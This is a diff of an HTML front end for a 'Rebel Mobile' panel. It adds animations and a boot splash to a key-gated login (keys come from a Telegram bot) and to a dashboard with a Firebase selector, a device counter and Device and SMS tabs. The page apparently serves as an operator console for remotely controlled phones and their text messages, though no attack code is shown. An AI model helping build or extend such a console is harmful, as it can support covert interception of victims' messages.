@@ -11,11 +11,25 @@
 <link rel="stylesheet" href="style.css"/>
 </head>
 <body>
-
+<div class="bg-anim" aria-hidden="true">
+  <canvas id="particleCanvas" class="particle-canvas"></canvas>
+  <span class="orb orb-1"></span><span class="orb orb-2"></span><span class="orb orb-3"></span>
+  <span class="grid-lines"></span>
+  <span class="aurora"></span>
+</div>
+<div class="fx-layer" id="fxLayer"></div>
+<div class="boot-splash" id="bootSplash">
+  <div class="boot-hex"></div>
+  <div class="boot-logo"><span class="boot-ring"></span><span class="boot-ring r2"></span><img src="avatar.jpg" alt="" onerror="this.style.display='none'"/></div>
+  <div class="boot-title glitch" data-text="Rebel Panel"><em>Rebel</em> Panel</div>
+  <div class="boot-bar"><span class="boot-bar-fill"></span></div>
+  <div class="boot-scan"></div>
+</div>
 
 <!-- LOGIN -->
 <div class="login-screen" id="loginScreen">
-  <div class="login-card">
+  <div class="login-card anim-in" id="loginCard">
+    <div class="card-shine"></div>
     <div class="login-hero">
       <div class="avatar-stage" id="rebelAvatarStage" data-avatar-ver="7">
         <div class="avatar-face-ring">
@@ -37,13 +51,13 @@
           <div class="laptop-base"></div>
         </div>
       </div>
-      <h1><em>Rebel</em> Mobile</h1>
+      <h1 class="glitch-sm" data-text="Rebel Mobile"><em>Rebel</em> Mobile</h1>
     </div>
     <p class="login-sub">Key from Telegram — @Rebelpanelbot → /genkey</p>
     <div class="login-err" id="loginErr"></div>
     <input class="key-input" id="loginKey" placeholder="RBL-XXXXXX-XXXXXX" autocomplete="off" maxlength="32"/>
     <label class="remember"><input type="checkbox" id="rememberMe" checked/> Remember this phone</label>
-    <button class="btn-primary" id="loginBtn" onclick="doLogin()">Unlock Panel</button>
+    <button class="btn-primary" id="loginBtn" onclick="doLogin()"><span class="btn-label">Unlock Panel</span></button>
   </div>
 </div>
 
@@ -55,17 +69,17 @@
         <img src="avatar.jpg" alt="Rebel" onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/main/IMG_20260609_231734_741.jpg'"/>
       </div>
       <div>
-        <div class="hdr-title">Rebel Mobile</div>
+        <div class="hdr-title">Rebel Mobile <span class="live-dot" id="hdrLive"></span></div>
         <div class="hdr-sub" id="hdrSub">Connecting...</div>
       </div>
     </div>
     <div class="hdr-actions">
       <button class="fb-chip" id="fbChip" onclick="openFbSheet()">Firebase ▾</button>
-      <button class="icon-btn" onclick="refreshData()" title="Refresh">↻</button>
+      <button class="icon-btn" id="refreshBtn" onclick="refreshData()" title="Refresh">↻</button>
     </div>
   </header>
 
-  <div class="screens">
+  <div class="screens" id="screensWrap">
     <section class="screen active" id="screen-home">
       <div class="stats-row">
         <div class="stat-card"><div class="stat-val" id="stTotal">0</div><div class="stat-lbl">DEVICES</div></div>
@@ -110,7 +124,7 @@
     </section>
   </div>
 
-  <nav class="bottom-nav">
+  <nav class="bottom-nav" id="bottomNav">
     <button class="nav-item active" data-tab="home" onclick="switchTab('home',this)"><span class="ico">🏠</span>Home</button>
     <button class="nav-item" data-tab="device" onclick="switchTab('device',this)"><span class="ico">📱</span>Device</button>
     <button class="nav-item" data-tab="sms" onclick="switchTab('sms',this)"><span class="ico">💬</span>SMS</button>
